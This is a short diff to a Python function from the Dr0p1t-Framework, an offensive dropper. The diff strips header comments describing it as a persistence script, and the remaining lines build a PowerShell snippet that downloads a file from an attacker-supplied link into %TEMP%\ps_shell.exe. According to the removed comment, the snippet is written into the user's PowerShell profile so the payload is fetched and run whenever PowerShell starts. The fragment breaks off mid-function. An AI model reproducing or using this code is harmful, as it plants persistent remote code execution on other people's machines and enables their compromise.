@@ -1,7 +1,3 @@
-#Written by: Karim shoair - D4Vinci ( Dr0p1t-Framework )
-#This is a persistence script aims to add your link to powershell user profile so your file will be downloaded and ran every time powershell.exe run if it doesn't exist
-#Start
-
 def profile(link):
 	code  = '\nif(-Not (Test-Path "$env:TEMP\ps_shell.exe") ){'
 	code += '\n(New-Object System.Net.WebClient).DownloadFile("{}","$env:TEMP\ps_shell.exe")'.format(link)
